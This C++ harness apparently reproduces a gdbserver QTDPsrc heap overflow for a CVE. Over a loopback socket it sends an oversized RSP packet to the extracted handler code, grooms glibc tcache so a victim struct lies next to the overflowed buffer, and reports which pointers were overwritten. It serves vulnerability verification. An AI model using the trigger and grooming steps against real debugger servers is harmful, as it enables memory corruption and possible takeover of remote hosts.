// CVE-2026-121997: loopback wire-fed RSP dispatcher harness.
//
// The wire framing (RSP '$payload#checksum' with '+' ack), the loopback
// socket, the helper stubs and the hex decoder below are harness code.
// The cmd_qtdpsrc() slice and handle_tracepoint_general_set() slice are
// extracted verbatim from the pinned gdbserver/tracepoint.cc at
// 633ae02c4ea8f87c670f7192804349860cfa291d (or its fixed snapshot) and
// included by run.sh. ishex/unpack_varlen_hex are verbatim pinned slices.
// No full gdbserver build, no gdbserver daemon, no qGetTLSAddr and no
// command execution: this measures the real handler on a real socket with
// a stub transport.
#include <arpa/inet.h>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

typedef unsigned long long ULONGEST;
typedef unsigned char gdb_byte;

static char pulongest_buf[32];
static const char *
pulongest (ULONGEST v)
{
  snprintf (pulongest_buf, sizeof (pulongest_buf), "%llu", v);
  return pulongest_buf;
}

static char paddress_buf[32];
static const char *
paddress (ULONGEST a)
{
  snprintf (paddress_buf, sizeof (paddress_buf), "%llx", a);
  return paddress_buf;
}

static void
write_ok (char *b)
{
  strcpy (b, "OK");
}

static void
write_enn (char *b)
{
  strcpy (b, "E01");
}

#define trace_debug(...) do { } while (0)

// Verbatim struct source_string from the pinned tracepoint.cc:563-577:
// three pointers, 24 bytes on this host.
struct source_string
{
  char *type;
  char *str;
  struct source_string *next;
};


// Verbatim struct process_info_private from the pinned
// gdbserver/linux-low.h:124-138, with only its two opaque types declared
// here. This tests the advisory's claimed field placement, not a live
// process_info_private instance.
typedef unsigned long CORE_ADDR;
struct arch_process_info;
struct thread_db;
#include "ppriv_fn.inc"
struct tracepoint
{
  struct source_string *source_strings;
};

static struct tracepoint the_tp;

static struct tracepoint *
find_tracepoint (int num, ULONGEST addr)
{
  (void) num;
  (void) addr;
  return &the_tp;
}

static bool
startswith (const char *s, const char *prefix)
{
  return strncmp (s, prefix, strlen (prefix)) == 0;
}

static bool
streq (const char *a, const char *b)
{
  return strcmp (a, b) == 0;
}

// Real glibc malloc, not an instrumented arena. Record the most recent
// 2-byte allocation (slen+1) so plain mode can measure the live layout.
static char *src_ptr;

static char *
xmalloc (size_t n)
{
  char *p = (char *) malloc (n);
  if (p == nullptr)
    abort ();
  if (n == 2)
    src_ptr = p;
  return p;
}

static void
xfree (void *p)
{
  free (p);
}

#define XNEW(T) ((T *) xmalloc (sizeof (T)))

// Stubs for the other branches of the verbatim dispatcher. Only the
// QTDPsrc branch reaches a real pinned handler in this harness.
#define CMD_STUB(name) static void name (char *b) { write_enn (b); }
CMD_STUB (cmd_qtinit)
CMD_STUB (cmd_qtdp)
static void
cmd_qtenable_disable (char *b, int enable)
{
  (void) enable;
  write_enn (b);
}
CMD_STUB (cmd_qtdv)
CMD_STUB (cmd_qtro)
CMD_STUB (cmd_qtstart)
CMD_STUB (cmd_qtstop)
CMD_STUB (cmd_qtdisconnected)
CMD_STUB (cmd_qtframe)
CMD_STUB (cmd_bigqtbuffer_circular)
CMD_STUB (cmd_bigqtbuffer_size)
CMD_STUB (cmd_qtnotes)

// Verbatim pinned RSP helper slices.
#include "rsp_helpers.inc"

// Faithful fixed-count two-nibble decoder (the same reimplementation the
// staged direct-call harness uses; GDB's hex2bin was not in the pinned
// gdbsupport/rsp-low.cc slice provisioned for this lane).
static int
hex2bin (const char *hex, gdb_byte *bin, int count)
{
  for (int i = 0; i < count; ++i)
    {
      int v = 0;
      for (int shift = 4; shift >= 0; shift -= 4)
	{
	  int nib = (unsigned char) *hex++;
	  if (nib >= '0' && nib <= '9')
	    v |= (nib - '0') << shift;
	  else if (nib >= 'a' && nib <= 'f')
	    v |= (nib - 'a' + 10) << shift;
	  else if (nib >= 'A' && nib <= 'F')
	    v |= (nib - 'A' + 10) << shift;
	  else
	    {
	      fprintf (stderr, "HEX2BIN_BAD_NIBBLE=1\n");
	      exit (81);
	    }
	}
      bin[i] = (gdb_byte) v;
    }
  return count;
}

#include "qtdpsrc_fn.inc"
#include "dispatch_fn.inc"

static unsigned char
pattern (size_t i)
{
  return (unsigned char) (0x41 + (i & 0x1f));
}

static uint64_t
pattern_word (size_t off)
{
  uint64_t v = 0;
  for (int k = 7; k >= 0; --k)
    v = (v << 8) | pattern (off + (size_t) k);
  return v;
}

static uint64_t
read_word (const void *p)
{
  uint64_t v;
  memcpy (&v, p, sizeof (v));
  return v;
}

static int
checksum (const char *payload, size_t len)
{
  unsigned int sum = 0;
  for (size_t i = 0; i < len; ++i)
    sum += (unsigned char) payload[i];
  return (int) (sum & 0xff);
}

static void
send_all (int fd, const char *s, size_t len)
{
  size_t off = 0;
  while (off < len)
    {
      ssize_t n = write (fd, s + off, len - off);
      if (n <= 0)
	return;
      off += (size_t) n;
    }
}

int
main (int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "attack";
  int n = argc > 2 ? atoi (argv[2]) : 64;
  int groom = argc > 3 ? atoi (argv[3]) : 0;
  if (n < 1 || n > 128)
    return 90;
  int plain = getenv ("PLAIN_MODE") != nullptr;

  char hex[512];
  for (int i = 0; i < n; ++i)
    snprintf (hex + 2 * i, 3, "%02x", pattern ((size_t) i));
  hex[2 * n] = '\0';
  ULONGEST slen = (strcmp (mode, "safe") == 0) ? (ULONGEST) n : 1ULL;
  char packet[1024];
  snprintf (packet, sizeof (packet), "QTDPsrc:1:0:cond:0:%llx:%s",
	    slen, hex);
  printf ("MODE=%s USEDLEN=%d DECLARED=%llu GROOM=%d PLAIN=%d\n",
	  mode, n, slen, groom, plain);
  fflush (stdout);

  struct source_string *victim = nullptr;
  struct process_info_private *pvp = nullptr;
  if (groom)
    {
      // The handler allocates srctype (5 bytes, 0x20 bin) before src
      // (slen+1 = 2 bytes, same bin). Prime that bin with two holes and
      // put the live victim between them in address order: hole1, victim,
      // hole2. LIFO tcache then gives srctype=hole2 and src=hole1, so the
      // overflow from src runs straight into the victim chunk.
      char *hole1 = xmalloc (2);
      if (groom == 2)
	{
	  pvp = XNEW (struct process_info_private);
	  pvp->arch_private = (struct arch_process_info *) 0x1111111111111111ULL;
	  pvp->thread_db = (struct thread_db *) 0x2323232323232323ULL;
	  pvp->r_debug = 0x3434343434343434ULL;
	  pvp->mem_fd = 0x45454545;
	}
      else
	{
	  victim = XNEW (struct source_string);
	  victim->type = (char *) 0x1212121212121212ULL;
	  victim->str = (char *) 0x2323232323232323ULL;
	  victim->next = (struct source_string *) 0x3434343434343434ULL;
	}
      char *hole2 = xmalloc (2);
      xfree (hole1);
      xfree (hole2);
    }

  int ls = socket (AF_INET, SOCK_STREAM, 0);
  if (ls < 0)
    return 91;
  int one = 1;
  setsockopt (ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof (one));
  struct sockaddr_in addr;
  memset (&addr, 0, sizeof (addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl (INADDR_LOOPBACK);
  addr.sin_port = 0;
  if (bind (ls, (struct sockaddr *) &addr, sizeof (addr)) != 0
      || listen (ls, 1) != 0)
    return 92;
  socklen_t alen = sizeof (addr);
  getsockname (ls, (struct sockaddr *) &addr, &alen);
  unsigned short port = ntohs (addr.sin_port);
  printf ("LOOPBACK_PORT=%u\n", port);
  fflush (stdout);

  pid_t child = fork ();
  if (child == 0)
    {
      int fd = socket (AF_INET, SOCK_STREAM, 0);
      struct sockaddr_in sa;
      memset (&sa, 0, sizeof (sa));
      sa.sin_family = AF_INET;
      sa.sin_addr.s_addr = htonl (INADDR_LOOPBACK);
      sa.sin_port = htons (port);
      if (fd < 0 || connect (fd, (struct sockaddr *) &sa, sizeof (sa)) != 0)
	_exit (93);
      char frame[1200];
      int csum = checksum (packet, strlen (packet));
      snprintf (frame, sizeof (frame), "$%s#%02x", packet, csum);
      send_all (fd, frame, strlen (frame));
      char ack[8];
      ssize_t got = read (fd, ack, 1);
      char reply[1200];
      size_t rlen = 0;
      while (rlen < sizeof (reply) - 1)
	{
	  ssize_t r = read (fd, reply + rlen, 1);
	  if (r <= 0)
	    break;
	  rlen += (size_t) r;
	  if (reply[rlen - 1] == '#')
	    {
	      if (rlen + 2 <= sizeof (reply) - 1)
		{
		  read (fd, reply + rlen, 2);
		  rlen += 2;
		}
	      break;
	    }
	}
      reply[rlen] = '\0';
      printf ("CLIENT_ACK=%c CLIENT_REPLY=%s\n",
	      got == 1 ? ack[0] : '?', reply);
      fflush (stdout);
      _exit (0);
    }

  int fd = accept (ls, nullptr, nullptr);
  if (fd < 0)
    return 94;
  char buf[1200];
  size_t blen = 0;
  while (blen < sizeof (buf) - 1)
    {
      ssize_t r = read (fd, buf + blen, 1);
      if (r <= 0)
	break;
      blen += (size_t) r;
      if (buf[blen - 1] == '#')
	{
	  if (blen + 2 <= sizeof (buf) - 1)
	    {
	      read (fd, buf + blen, 2);
	      blen += 2;
	    }
	  break;
	}
    }
  buf[blen] = '\0';
  if (blen < 4 || buf[0] != '$' || buf[blen - 3] != '#')
    return 95;
  char rxsum[3] = { buf[blen - 2], buf[blen - 1], '\0' };
  int wire_sum = (int) strtol (rxsum, nullptr, 16);
  buf[blen - 3] = '\0';
  char *payload = buf + 1;
  printf ("WIRE_PAYLOAD_LEN=%zu WIRE_CHECKSUM=%02x WIRE_MATCH=%d\n",
	  strlen (payload), checksum (payload, strlen (payload)),
	  wire_sum == checksum (payload, strlen (payload)));
  fflush (stdout);
  if (wire_sum != checksum (payload, strlen (payload)))
    {
      send_all (fd, "-", 1);
      return 96;
    }
  send_all (fd, "+", 1);

  char own_buf[1024];
  snprintf (own_buf, sizeof (own_buf), "%s", payload);
  printf ("DISPATCH_ENTER=1\n");
  fflush (stdout);
  int handled = handle_tracepoint_general_set (own_buf);
  printf ("DISPATCH=%d REPLY_FROM_HANDLER=%s\n", handled, own_buf);
  fflush (stdout);
  char reply_frame[1200];
  int rsum = checksum (own_buf, strlen (own_buf));
  snprintf (reply_frame, sizeof (reply_frame), "$%s#%02x", own_buf, rsum);
  send_all (fd, reply_frame, strlen (reply_frame));

  if (victim && src_ptr)
    {
      uint64_t expect_type = pattern_word (32);
      uint64_t expect_str = pattern_word (40);
      uint64_t expect_next = pattern_word (48);
      uint64_t expect_size = pattern_word (24);
      uint64_t got_type = read_word (&victim->type);
      uint64_t got_str = read_word (&victim->str);
      uint64_t got_next = read_word (&victim->next);
      uint64_t got_size = read_word ((char *) victim - 8);
      int corrupt = (got_type != 0x1212121212121212ULL
		     || got_str != 0x2323232323232323ULL
		     || got_next != 0x3434343434343434ULL);
      printf ("LAYOUT SRC=%p VICTIM=%p DELTA=%ld\n",
	      (void *) src_ptr, (void *) victim,
	      (long) ((char *) victim - src_ptr));
      printf ("LAYOUT CHUNKSIZE=%016llx EXPECT=%016llx SIZE_HIT=%d\n",
	      (unsigned long long) got_size,
	      (unsigned long long) expect_size,
	      got_size == expect_size);
      printf ("LAYOUT TYPE=%016llx EXPECT=%016llx "
	      "STR=%016llx EXPECT=%016llx "
	      "NEXT=%016llx EXPECT=%016llx "
	      "ADJACENT_CORRUPTED=%d\n",
	      (unsigned long long) got_type,
	      (unsigned long long) expect_type,
	      (unsigned long long) got_str,
	      (unsigned long long) expect_str,
	      (unsigned long long) got_next,
	      (unsigned long long) expect_next, corrupt);
      fflush (stdout);
    }

  if (pvp && src_ptr)
    {
      uint64_t expect_arch = pattern_word (32);
      uint64_t expect_tdb = pattern_word (40);
      uint64_t expect_debug = pattern_word (48);
      uint64_t got_arch = read_word (&pvp->arch_private);
      uint64_t got_tdb = read_word (&pvp->thread_db);
      uint64_t got_debug = read_word (&pvp->r_debug);
      uint64_t got_size = read_word ((char *) pvp - 8);
      int corrupt = (got_tdb != 0x2323232323232323ULL
		     || got_debug != 0x3434343434343434ULL);
      printf ("LAYOUT SRC=%p VICTIM=%p DELTA=%ld\n",
	      (void *) src_ptr, (void *) pvp,
	      (long) ((char *) pvp - src_ptr));
      printf ("LAYOUT CHUNKSIZE=%016llx EXPECT=%016llx SIZE_HIT=%d\n",
	      (unsigned long long) got_size,
	      (unsigned long long) pattern_word (24),
	      got_size == pattern_word (24));
      printf ("PRIV ARCH=%016llx EXPECT=%016llx "
	      "THREADDB=%016llx EXPECT=%016llx THREADDB_HIT=%d "
	      "RDEBUG=%016llx EXPECT=%016llx "
	      "ADJACENT_CORRUPTED=%d\n",
	      (unsigned long long) got_arch,
	      (unsigned long long) expect_arch,
	      (unsigned long long) got_tdb,
	      (unsigned long long) expect_tdb,
	      got_tdb == expect_tdb,
	      (unsigned long long) got_debug,
	      (unsigned long long) expect_debug, corrupt);
      fflush (stdout);
    }

  waitpid (child, nullptr, 0);
  close (fd);
  close (ls);
  return 0;
}
